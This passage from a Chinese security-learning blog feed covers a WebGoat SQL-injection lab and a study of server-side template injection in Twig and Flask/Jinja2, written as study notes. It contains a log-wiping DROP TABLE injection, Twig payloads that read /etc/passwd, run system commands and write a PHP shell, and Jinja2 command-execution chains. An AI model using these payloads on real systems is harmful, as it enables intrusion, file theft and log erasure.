    <content type="html"><![CDATA[<p>学习webgoat靶场的时候遇到一个有意思的sql注入</p><p>在这之前值得一提的是，sql的所有操作都会记录到<strong>access_log</strong>这个表中，如果可以堆叠注入，最后记得要清除这个表：</p><pre><code>1&#39;;drop table access_log; -- -</code></pre><p>然后是一道sql：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311181522955.png" alt="image-20231118152250268"></p><p>首先探测一下注入点</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311181611314.png" alt="img"></p><p>这里是实际是成功执行了查询，显示没有结果，所以没有注入点，否则应该会报错</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311181526454.png" alt="image-20231118152647292"></p><p>这里比较扯，他说这个名字存在，但其实应该是注入生效返回了True</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311181528156.png" alt="image-20231118152823527"></p><p>对密码进行测试的时候直接创建了，然而我两次输入的密码明明是不一样的，这里把握搞晕了。后来查看了一下博客发现我跑偏题了，username这里能进行注入，那么通过这个地方要么查询要么修改Tom的密码然后登陆</p><p>然后到了bool盲注的阶段，这里不再赘述了，只是个人经验不是很足，对这个回显麻痹了一下，觉得挺有意思的。</p><h2 id="然后是一些防御："><a href="#然后是一些防御：" class="headerlink" title="然后是一些防御："></a>然后是一些防御：</h2><h3 id="静态查询"><a href="#静态查询" class="headerlink" title="静态查询"></a>静态查询</h3><pre><code>SELECT * FROM users WHERE user = &quot;&#39;&quot; + session.getAttribute(&quot;UserID&quot;) + &quot;&#39;&quot;;</code></pre><p>这里专门查询了一下：</p><pre><code>- 静态 SQL：静态 SQL 语句一般用于嵌入式 SQL 应用中，在程序运行前，SQL 语句必须是确定的，例如 SQL 语句中涉及的列名和表名必须是存在的。静态 SQL 语句的编译是在应用程序运行前进行的，编译的结果会存储在数据库内部。而后程序运行时，数据库将直接执行编译好的 SQL 语句，降低运行时的开销。静态SQL在编译时已经确定了引用的表和列。 宿主变量不改变表和列信息。 可以使用主变量改变查询参数值， 但是不能用主变量代替表名或列名。- 动态 SQL：动态 SQL 语句是在应用程序运行时被编译和执行的，不在编译时确定 SQL 的表和列，而是让程序在运行时提供，并将SQL 语句文本传给 DBMS 执行。 静态 SQL 语句在编译时已经生成执行计划。 而动态 SQL 语句，只有在执行时才产生执行计划。动态 SQL 语句首先执行 PREPARE 语句要求 DBMS 分析、确认和优化语句，并为其生成执行计划。例如，使用 DB2 的交互式工具 CLP 访问数据库时，用户输入的 SQL 语句是不确定的，因此 SQL 语句只能被动态地编译。动态 SQL 的应用较多，常见的 CLI 和 JDBC 应用程序都使用动态 SQL。</code></pre><p>所以这里的静态语句是直接确定的，在程序运行以前就编译好了，用户无法自主控制</p><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><p>这个就不说了，预编译虽然是一个非常有效的的sql注入防御方法，但是听D4n师傅说有些语句和sql的特性注定了会被注入，然后简单查询了一下：</p><p>[SQL预编译的绕过_sql注入绕过预编译-CSDN博客](<a href="https://blog.csdn.net/AoaNgzh/article/details/130459165#:~:text=SQL%E9%A2%84%E7%BC%96%E8%AF%91%E7%9A%84%E7%BB%95%E8%BF%87">https://blog.csdn.net/AoaNgzh/article/details/130459165#:~:text=SQL预编译的绕过</a> 1 字符串拼接：如果在SQL预编译语句中使用了字符串拼接，攻击者可以通过构造特定的字符串来绕过预编译过程。 2,动态拼接SQL语句：如果动态地拼接SQL语句，例如使用字符串拼接、字符串格式化等方式，攻击者同样可以利用字符串的特性来绕过预编译过程。 3 SQL语句中使用函数或存储过程：如果在SQL语句中使用了函数或存储过程，攻击者可以构造恶意的输入，使其执行预期之外的操作，绕过预编译过程。 4 错误处理不当：如果SQL预编译过程中的错误处理不当，例如忽略异常或者异常处理不当，攻击者可能会通过特定的输入来触发错误，绕过预编译过程。)</p><p>显然虽然可以绕过，但是明显已经有了很强的局限性</p><h3 id="最后是转义字符，即过滤掉一些特殊字符，以及WAF"><a href="#最后是转义字符，即过滤掉一些特殊字符，以及WAF" class="headerlink" title="最后是转义字符，即过滤掉一些特殊字符，以及WAF"></a>最后是转义字符，即过滤掉一些特殊字符，以及WAF</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;学习webgoat靶场的时候遇到一个有意思的sql注入&lt;/p&gt;
&lt;p&gt;在这之前值得一提的是，sql的所有操作都会记录到&lt;strong&gt;access_log&lt;/strong&gt;这个表中，如果可以堆叠注入，最后记得要清除这个表：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1&amp;#39;;dro</summary>
      
    
    
    
    
    <category term="WebGoat" scheme="https://taninluv.github.io/tags/WebGoat/"/>
    
  </entry>
  
  <entry>
    <title>关于SSTI的简单研究</title>
    <link href="https://taninluv.github.io/2023/11/13/SSTI/"/>
    <id>https://taninluv.github.io/2023/11/13/SSTI/</id>
    <published>2023-11-13T12:24:54.000Z</published>
    <updated>2023-11-15T00:40:54.128Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)</a></p><p><a href="https://ghostasky.github.io/2022/03/29/SSTI/#gallery">SSTI payload记录 | 郁涛丶’s Blog (ghostasky.github.io)</a></p><p>大纲参考：</p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)</a></p><p><a href="https://ghostasky.github.io/2022/03/29/SSTI/">SSTI payload记录 | 郁涛丶’s Blog (ghostasky.github.io)</a></p><p>这里只是了解一下模板的大致原理，不对如何构造payload过多强求</p><p>对于绕过黑名单的一些方法等后续遇到一个学一个，这里也不过多耗费精力，因为根本记不住hh</p><h1 id="PHP-ssti"><a href="#PHP-ssti" class="headerlink" title="PHP ssti"></a>PHP ssti</h1><h2 id="composer"><a href="#composer" class="headerlink" title="composer"></a>composer</h2><p><a href="https://www.runoob.com/w3cnote/composer-install-and-usage.html">Composer 安装与使用 | 菜鸟教程 (runoob.com)</a></p><h2 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/arrow_functions">箭头函数 - JavaScript | MDN (mozilla.org)</a></p><p><a href="https://zhuanlan.zhihu.com/p/366240343">搞明白JavaScript中的匿名函数 - 知乎 (zhihu.com)</a></p><p><a href="https://juejin.cn/post/7041055543984652319">这一次，彻底搞懂箭头函数 - 掘金 (juejin.cn)</a></p><p>箭头函数表达式的语法比<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/function">函数表达式</a>更简洁，并且没有自己的<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/this"><code>this</code></a>，<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/arguments"><code>arguments</code></a>，<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/super"><code>super</code></a>或<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/new.target"><code>new.target</code></a>。箭头函数表达式更适用于那些本来需要匿名函数的地方，并且它不能用作构造函数。</p><h2 id="Twig-基础"><a href="#Twig-基础" class="headerlink" title="Twig 基础"></a>Twig 基础</h2><p><a href="https://geek-docs.com/php/php-tutorial/php-twig.html#ftoc-heading-1">PHP Twig 教程|极客教程 (geek-docs.com)</a></p><p><a href="https://www.osgeo.cn/twig/filters/map.html">map — Twig 文档 (osgeo.cn)</a></p><p>先按照教程尝试简单的例子来了解Twig如何运作：</p><p>first.php：</p><pre><code class="php">&lt;?phprequire __DIR__ . &#39;/vendor/autoload.php&#39;;use Twig\Environment;use Twig\Loader\FilesystemLoader;$loader = new FilesystemLoader(__DIR__ . &#39;/templates&#39;);$twig = new Environment($loader);echo $twig-&gt;render(&#39;first.html.twig&#39;, [&#39;name&#39; =&gt; &#39;John Doe&#39;,     &#39;occupation&#39; =&gt; &#39;gardener&#39;]);</code></pre><p>这里使用<code>FilesystemLoader</code>从指定目录加载模板</p><p>输出通过<code>render()</code>生成。 它带有两个参数：模板文件和数据。</p><p>这里再补充一下render()，大概就是渲染加载的意思：</p><p><a href="https://juejin.cn/post/7030362678199582734">Vue中 渲染函数（render）的介绍和应用 - 掘金 (juejin.cn)</a></p><p>templates&#x2F;first.html.twig</p><pre><code class="php">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;p&gt;        &#123;&#123; name &#125;&#125; is a &#123;&#123; occupation &#125;&#125;    &lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>变量以<code>&#123;&#123;&#125;&#125;</code>语法输出。</p><p>filters.php</p><pre><code class="php">&lt;?phprequire __DIR__ . &#39;/vendor/autoload.php&#39;;use Twig\Environment;use Twig\Loader\FilesystemLoader;$loader = new FilesystemLoader(__DIR__ . &#39;/templates&#39;);$twig = new Environment($loader);$words = [&#39;sky&#39;, &#39;mountain&#39;, &#39;falcon&#39;, &#39;forest&#39;, &#39;rock&#39;, &#39;blue&#39;];$sentence = &#39;today is a windy day&#39;;echo $twig-&gt;render(&#39;filter.html.twig&#39;,     [&#39;words&#39; =&gt; $words, &#39;sentence&#39; =&gt;$sentence]);</code></pre><p>templates&#x2F;filters.html.twig</p><pre><code class="php">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Filters&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;p&gt;     The array has &#123;&#123; words | length &#125;&#125; elements    &lt;/p&gt;    &lt;p&gt;     Joined array elements: &#123;&#123; words | join(',') &#125;&#125;     &lt;/p&gt;        &lt;p&gt;     &#123;&#123; sentence | title &#125;&#125;     &lt;/p&gt;        &lt;/body&gt;&lt;/html&gt;</code></pre><p>if 、for等内容不再赘述，看看set标签：</p><h3 id="set标签"><a href="#set标签" class="headerlink" title="set标签"></a><code>set</code>标签</h3><p>允许将值设置为模板内的变量。</p><pre><code class="php">$words = [&#39;sky&#39;, &#39;mountain&#39;, &#39;falcon&#39;, &#39;forest&#39;,    &#39;rock&#39;, &#39;blue&#39;, &#39;solid&#39;, &#39;book&#39;, &#39;tree&#39;];echo $twig-&gt;render(&#39;test.html.twig&#39;, [&#39;words&#39; =&gt; $words]);</code></pre><pre><code class="php">&#123;% set sorted = words | sort %&#125;&lt;ul&gt;&#123;% for word in sorted %&#125;    <li>&#123;&#123; word &#125;&#125;</li>&#123;% endfor %&#125;&lt;/ul&gt;</code></pre><h3 id="verbatim标签"><a href="#verbatim标签" class="headerlink" title="verbatim标签"></a>verbatim标签</h3><p><code>verbatim</code>将部分标记为不应该分析的原始文本。</p><pre><code class="php">&#123;% verbatim %&#125;    <ul>    &#123;% for word in words %&#125;        <li>&#123;&#123; word &#125;&#125;</li>    &#123;% endfor %&#125;    </ul>&#123;% endverbatim %&#125;</code></pre><h3 id="Twig-自动转义"><a href="#Twig-自动转义" class="headerlink" title="Twig 自动转义"></a>Twig 自动转义</h3><p>Twig 自动转义某些字符，例如&lt;或&gt;。可以使用<code>autoescape</code>选项关闭自动转义</p><pre><code class="php">$twig = new Environment($loader, [    &#39;autoescape&#39; =&gt; false]);</code></pre><pre><code class="php">$data = &quot;&lt;script src=&#39;http::/example.com/nastyscript.js&#39;&gt;&lt;/script&gt;&quot;;echo $twig-&gt;render(&#39;autoescape.html.twig&#39;, [&#39;data&#39; =&gt; $data]);</code></pre><pre><code class="php">&lt;p&gt;The data is &#123;&#123; data &#125;&#125;&lt;/p&gt;&lt;p&gt;The data is &#123;&#123; data | raw &#125;&#125;&lt;/p&gt;</code></pre><p>如果启用了自动转义，我们可以使用<code>raw</code>过滤器显示原始输入。</p><pre><code class="php">&lt;p&gt;The data is &lt;script src=&#39;http://example.com/nastyscript.js&#39;&gt;&lt;/script&gt;&lt;/p&gt;&lt;p&gt;The data is &lt;script src=&#39;http://example.com/nastyscript.js&#39;&gt;&lt;/script&gt;&lt;/p&gt;</code></pre><p>其后的内容暂不研究，先回到主题–SSTI</p><h2 id="Twig-SSTI"><a href="#Twig-SSTI" class="headerlink" title="Twig SSTI"></a>Twig SSTI</h2><p>这里研究一下这篇博客：<a href="https://xz.aliyun.com/t/7518#toc-5">TWIG 全版本通用 SSTI payloads - 先知社区 (aliyun.com)</a></p><h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><p><code>map</code> 对应的函数是<code>twig_array_map</code> ,下面是其实现</p><pre><code>function twig_array_map($array, $arrow)&#123;    $r = [];    foreach ($array as $k =&gt; $v) &#123;        $r[$k] = $arrow($v, $k);    &#125;    return $r;&#125;</code></pre><p>从上面的代码我们可以看到，$arrow 是可控的，将数组的键值对分别作为箭头函数的两个参数，然后将执行结果赋值给$r，漏洞就来自这里。</p><p>arrow function最后会变成一个<code>closure</code></p><p>举个例子</p><pre><code>&#123;&#123;["man"]|map((arg)=>"hello #&#123;arg&#125;")&#125;&#125;</code></pre><p>会被编译成（在 Twig 模板引擎中，<code>#&#123;&#125;</code> 用于将变量的值嵌入到字符串中。）</p><pre><code>twig_array_map([0 =&gt; &quot;id&quot;], function ($__arg__) use ($context, $macros) &#123; $context[&quot;arg&quot;] = $__arg__;return (&quot;hello &quot; . ($context[&quot;arg&quot;] ?? null))</code></pre><p>在这里，<code>__arg__</code> 是 <code>twig_array_map</code> 中数组的每个元素，而不是一个回调函数的参数。在匿名函数的闭包内，<code>__arg__</code> 代表了数组中的当前元素。</p><p>可以不传arrow function，可以只传一个字符串。</p><p>所以我们需要找个两个参数的能够命令执行的危险函数即可。通过查阅常见的命令执行函数：</p><ul><li><blockquote><p>system ( string <code>$command</code> [, int <code>&amp;$return_var</code> ] ) : string</p></blockquote></li><li><blockquote><p>passthru ( string <code>$command</code> [, int <code>&amp;$return_var</code> ] )</p></blockquote></li><li><blockquote><p>exec ( string <code>$command</code> [, array <code>&amp;$output</code> [, int <code>&amp;$return_var</code> ]] ) : string</p></blockquote></li><li><blockquote><p>popen ( string <code>$command</code> , string <code>$mode</code> )</p></blockquote></li><li><blockquote><p>shell_exec ( string <code>$cmd</code> ) : string</p></blockquote></li></ul><p>如果以上都被ban了，那么使用<code>&#123;&#123;&#123;"<?php phpinfo();":"/var/www/html/shell.php"&#125;|map("file_put_contents")&#125;&#125;</code> 可以写个shell，实际上它相当于执行:</p><pre><code>file_put_contents（&quot;/var/www/html/shell.php&quot;，&quot;&lt;?php phpinfo();&quot;）</code></pre><p>要注意参数顺序</p><p>其他的暂不研究，上一下目前的payload：</p><pre><code>&#123;&#123;'/etc/passwd'|file_excerpt(1,30)&#125;&#125;&#123;&#123;app.request.files.get(1).__construct('/etc/passwd','')&#125;&#125;&#123;&#123;app.request.files.get(1).openFile.fread(99)&#125;&#125;&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("whoami")&#125;&#125;&#123;&#123;_self.env.enableDebug()&#125;&#125;&#123;&#123;_self.env.isDebug()&#125;&#125;&#123;&#123;["id"]|map("system")|join(",")&#123;&#123;&#123;"<?php phpinfo();":"/var/www/html/shell.php"&#125;|map("file_put_contents")&#125;&#125;&#123;&#123;["id",0]|sort("system")|join(",")&#125;&#125;&#123;&#123;["id"]|filter("system")|join(",")&#125;&#125;&#123;&#123;[0,0]|reduce("system","id")|join(",")&#125;&#125;&#123;&#123;['cat /etc/passwd']|filter('system')&#125;&#125;</code></pre><p>php 中的模板还有一些，暂时先放一放，原理应该大同小异，接下来先看看python下的模板注入：</p><h1 id="python-ssti"><a href="#python-ssti" class="headerlink" title="python ssti"></a>python ssti</h1><p>这里还是顺带以flask为入口简单了解一下python web：</p><p><a href="https://blog.csdn.net/weixin_45950544/article/details/104067405">Flask之最易懂的基础教程一（2020年最新-从入门到精通）-CSDN博客</a></p><p>简单使用：</p><pre><code># 导入Flask类库from flask import Flask# 创建应用实例app = Flask(__name__)# 视图函数（路由）@app.route(&#39;/&#39;)def index():    return &#39;&lt;h1&gt;Hello Flask!&lt;h1&gt;&#39;# 启动实施（只在当前模块运行）if __name__ == &#39;__main__&#39;:    app.run()</code></pre><p>这里可以设置app.run(debug&#x3D;True)方便调试</p><p>带参数的视图函数：</p><pre><code># 导入Flask类库from flask import Flask# 创建应用实例app = Flask(__name__)# 视图函数（路由）@app.route(&#39;/user/&lt;username&gt;&#39;)def setname(username):    username=&#39;2333&#39;    return usernamedef say_hello(username):    return &#39;&lt;h1&gt;Hello %s !&lt;h1&gt;&#39; % username# 启动实施（只在当前模块运行）if __name__ == &#39;__main__&#39;:    app.run(debug=True)</code></pre><p>这里一个路由下可以有多个视图函数，但是返回值值能时最后一个视图函数的返回值，因为依次执行视图函数后后面的覆盖前面的</p><p>关于参数：</p><blockquote><p>参数要写在&lt;&gt;中、</p><p>视图函数的参数要与路由中的一致</p><p>也可以指定参数类型（int&#x2F;float&#x2F;path），默认是字符串</p><ul><li><p>**<code>int</code>**：匹配一个整数类型的 URL 变量。</p></li><li><p>**<code>float</code>**：匹配一个浮点数类型的 URL 变量。</p></li><li><p>**<code>path</code>**：匹配一个字符串类型的 URL 变量，但不限制其内容，可以包含斜杠 <code>/</code>。</p><p>@app.route(‘&#x2F;user&#x2F;<a href="path:info">path:info</a>‘)</p></li></ul></blockquote><h5 id="获取request请求值"><a href="#获取request请求值" class="headerlink" title="获取request请求值"></a>获取request请求值</h5><pre><code># 导入Flask类库from flask import Flask,request# 创建应用实例app = Flask(__name__)# request@app.route(&#39;/request/&lt;path:info&gt;&#39;)def request_url(info):    # 完整的请求URL    return request.url    &#39;&#39;&#39;    url：127.0.0.1:5000/request/abc/def?username=xiaoming&amp;pwd=123    网页返回值：http://127.0.0.1:5000/request/abc/def?username=xiaoming&amp;pwd=123    &#39;&#39;&#39;    # 去掉GET参数的URL    return request.base_url    &#39;&#39;&#39;    网页返回值：http://127.0.0.1:5000/request/abc/def    &#39;&#39;&#39;    # 只有主机和端口的URL    return request.host_url    &#39;&#39;&#39;    网页返回值：http://127.0.0.1:5000/    &#39;&#39;&#39;    # 装饰器中写的路由地址    return request.path    &#39;&#39;&#39;    网页返回值：/request/abc/def    &#39;&#39;&#39;    # 请求方法类型    return request.method    &#39;&#39;&#39;    网页返回值：GET （也有可能是POST）    &#39;&#39;&#39;    # 远程地址    return request.remote_addr    &#39;&#39;&#39;    网页返回值：127.0.0.1:5000    &#39;&#39;&#39;    # 获取url参数    return request.args.get(&#39;username&#39;)    return request.args.get(&#39;pwd&#39;)    return str(request.args)    # 获取headers信息    return request.headers.get(&#39;User-Agent&#39;)# 启动实施（只在当前模块运行）if __name__ == &#39;__main__&#39;:    app.run()</code></pre><h5 id="响应的构造（make-response）"><a href="#响应的构造（make-response）" class="headerlink" title="响应的构造（make_response）"></a>响应的构造（make_response）</h5><pre><code>from flask import Flask,make_responseapp = Flask(__name__)@app.route(&#39;/response/&#39;)def response():    # 不指定状态码，默认为200，表示OK    # return ‘OK’    # 构造一个404状态码    # 方法一    return &#39;not fount&#39;,404    # 方法二    # 导入make_response    # 自定义构造一个响应，然后返回200，构造也可以指定状态码404    res = make_response(&#39;我是通过函数构造的响应&#39;,404)    return resif __name__ == &#39;__main__&#39;:    app.run()</code></pre><p>其他一些开发细节暂不深入，先看一下jinja2</p><p>先看一看介绍：</p><p>Flask模板</p><ol><li>模板介绍：<br> 结构清晰、易于维护的代码开发原则是程序员追求的目标之一。目前我们所写的代码都比较简单，但是很明显的可以预见的一个问题是，当项目越来越复杂时，视图函数将变得异常庞大和繁琐，因为视图函数中存放了业务逻辑和表现逻辑。<br> 解决这类问题的通用方法是将不同种类的逻辑分开存放：<br> 业务逻辑：存放在视图函数中，专门处理用户的业务需求；<br> 表现逻辑：存放在单独的模板文件夹中，负责表现效果。</li><li>模板引擎<br> 指定了一套特定的语法来实现表达逻辑，提供了一种专门的替换接口将模板文件换成目标文件（html）。——flask中提供了专门的模板引擎（jinja2）</li></ol><p>看起来模板主要是接管了表现效果的单独文件夹，先看一个简单的例子：</p><pre><code>from flask import Flask,render_template,render_template_string,gfrom flask_script import Managerapp = Flask(__name__)manager = Manager(app)@app.route(&#39;/index&#39;)def index():    # return &#39;模板引擎测试&#39;    # 渲染模板文件    return render_template(&#39;index.html&#39;)@app.route(&#39;/index/&lt;name&gt;&#39;)def welcome(name):    # 变量参数写在渲染函数的后面作为参数，前面的name是形参，后面的name是渲染模板中的解析内容    # return render_template(&#39;index.html&#39;,name=name)    # 第二种方法，使用render_template_string（渲染字符串）    # return render_template_string(&#39;&lt;h2&gt;hello &#123;&#123; name &#125;&#125; ! &lt;h2&gt;&#39;,name=name)    # 第三种方法，使用  g（全局函数）,不需要分配就可以在模板中使用,    # 只需要给定渲染模板即可；    g.name = name    return render_template(&#39;index.html&#39;)if __name__ == &#39;__main__&#39;:    manager.run()</code></pre><blockquote><p>在 Flask 中，默认情况下，<code>render_template(&#39;index.html&#39;)</code> 会在指定的模板文件夹内查找名为 <code>index.html</code> 的模板文件。</p><p>Flask 默认的模板文件夹是项目根目录下的 <code>templates</code> 文件夹。所以，如果你的 <code>index.html</code> 文件位于 <code>templates</code> 文件夹下，那么 <code>render_template(&#39;index.html&#39;)</code> 将会在这个文件夹中查找并渲染 <code>index.html</code> 文件。</p><p>如果你的 <code>index.html</code> 文件不在默认的 <code>templates</code> 文件夹中，而是在其他文件夹，你可以通过指定文件夹路径的方式告诉 Flask 在哪里找到模板文件。你需要在创建 Flask 应用时通过指定 <code>template_folder</code> 参数来设置模板文件夹的路径，如下所示：</p><pre><code>pythonCopy codeapp = Flask(__name__, template_folder=&#39;your_template_folder_path&#39;)</code></pre><p>确保将 <code>&#39;your_template_folder_path&#39;</code> 替换为实际存储模板文件的文件夹路径。这样 Flask 就会在指定的文件夹中查找并渲染模板文件。</p></blockquote><p>然后这里也可以使用函数-类似twig中的filter：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311141654641.png" alt="image-20231114165408388"></p><h3 id="类的知识总结"><a href="#类的知识总结" class="headerlink" title="类的知识总结"></a>类的知识总结</h3><pre><code>__class__            类的一个内置属性，表示实例对象的类。__base__             类型对象的直接基类__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases____mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.__init__             初始化类，返回的类型是function__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#39;b&#39;]，就是a.__getitem__(&#39;b&#39;)__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()]__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app。get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app。lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__['os'].popen('ls').read()&#125;&#125;current_app          应用上下文，一个全局变量。request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/proc\self\fd/3&#39;).read()request.args.x1    get传参request.values.x1  所有参数request.cookies      cookies参数request.headers      请求头参数request.form.x1    post传参(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)request.data   post传参(Content-Type:a/b)request.json post传json  (Content-Type: application/json)config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__['os'].popen('ls').read() &#125;&#125;g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of &#39;flask_ssti&#39;&gt;</code></pre><h3 id="常见过滤器"><a href="#常见过滤器" class="headerlink" title="常见过滤器"></a>常见过滤器</h3><p><a href="https://ttl255.com/jinja2-tutorial-part-4-template-filters/#references">Jinja2 Tutorial - Part 4 - Template filters | (ttl255.com)</a></p><pre><code>常用的过滤器int()：将值转换为int类型；float()：将值转换为float类型；lower()：将字符串转换为小写；upper()：将字符串转换为大写；title()：把值中的每个单词的首字母都转成大写；capitalize()：把变量值的首字母转成大写，其余字母转小写；trim()：截取字符串前面和后面的空白字符；wordcount()：计算一个长字符串中单词的个数；reverse()：字符串反转；replace(value,old,new)： 替换将old替换为new的字符串；truncate(value,length=255,killwords=False)：截取length长度的字符串；striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;'<em>hello</em>'|safe&#125;&#125;；list()：将变量列成列表；string()：将变量转换成字符串；join()：将一个序列中的参数值拼接成字符串。示例看上面payload；abs()：返回一个数值的绝对值；first()：返回一个序列的第一个元素；last()：返回一个序列的最后一个元素；format(value,arags,*kwargs)：格式化字符串。比如：&#123;&#123; "%s" - "%s"|format('Hello?',"Foo!") &#125;&#125;将输出：Helloo? - Foo!length()：返回一个序列或者字典的长度；sum()：返回列表内数值的和；sort()：返回排序后的列表；default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#39;xiaotuo&#39;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。length()返回字符串的长度，别名是count</code></pre><p>其他的开发类容暂不探究</p><h2 id="jinja-SSTI"><a href="#jinja-SSTI" class="headerlink" title="jinja SSTI"></a>jinja SSTI</h2><p><a href="https://zhuanlan.zhihu.com/p/93746437">CTF|有关SSTI的一切小秘密【Flask SSTI+姿势集+Tplmap大杀器】 - 知乎 (zhihu.com)</a></p><p>Flask SSTI 题的基本思路就是利用 python 中的 魔术方法 找到自己要用的函数。</p><ul><li>__dict__：保存类实例或对象实例的属性变量键值对字典</li><li>__class__：返回调用的参数类型</li><li>__mro__：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</li><li>__bases__：返回类型列表</li><li>__subclasses__：返回object的子类</li><li>__init__：类的初始化方法</li><li>__globals__：函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价</li></ul><blockquote><p><strong>base</strong> 和 <strong>mro</strong> 都是用来寻找基类的。</p></blockquote><p>我们可以使用</p><pre><code>for i, subclass in enumerate(str.__class__.__mro__[-1].__subclasses__()):    print(i, subclass)</code></pre><p>来方便查阅我们需要的某个子类的索引：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311141944262.png" alt="image-20231114194457561"></p><p>SSTI 的主要目的就是从这么多的子类中找出可以利用的类（一般是指读写文件或执行命令的类）加以利用。</p><p><a href="https://xz.aliyun.com/t/9584#toc-0">以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区 (aliyun.com)</a></p><p><code>__builtins__</code>：以一个集合的形式查看其引用</p><blockquote><h4 id="内建函数"><a href="#内建函数" class="headerlink" title="内建函数"></a>内建函数</h4><p>当我们启动一个python解释器时，即时没有创建任何变量或者函数，还是会有很多函数可以使用，我们称之为内建函数。</p><p>内建函数并不需要我们自己做定义，而是在启动python解释器的时候，就已经导入到内存中供我们使用，想要了解这里面的工作原理，我们可以从名称空间开始。</p><p><code>__builtins__</code> 方法是做为默认初始模块出现的，可用于查看当前所有导入的内建函数。</p></blockquote><p><code>__globals__</code>：该方法会以字典的形式返回当前位置的所有全局变量，与 func_globals 等价。该属性是函数特有的属性，记录当前文件全局变量的值，如果某个文件调用了os、sys等库，但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals属性访问全局的变量。该属性保存的是函数全局变量的字典引用。</p><pre><code>__import__()`：该方法用于动态加载类和函数 。如果一个模块经常变化就可以使用 `__import__()` 来动态载入，就是 `import`。语法：`__import__(模块名)</code></pre><p>这样我们在进行SSTI注入的时候就可以通过这种方式使用很多的类和方法，通过子类再去获取子类的子类、更多的方法，找出可以利用的类和方法加以利用。总之，是通过python的对象的继承来一步步实现文件读取和命令执行的：</p><pre><code>找到父类&lt;type &#39;object&#39;&gt; ---&gt; 寻找子类 ---&gt; 找关于命令执行或者文件操作的模块。</code></pre><h3 id="一些使用到的类或方法："><a href="#一些使用到的类或方法：" class="headerlink" title="一些使用到的类或方法："></a>一些使用到的类或方法：</h3><h4 id="文件读取"><a href="#文件读取" class="headerlink" 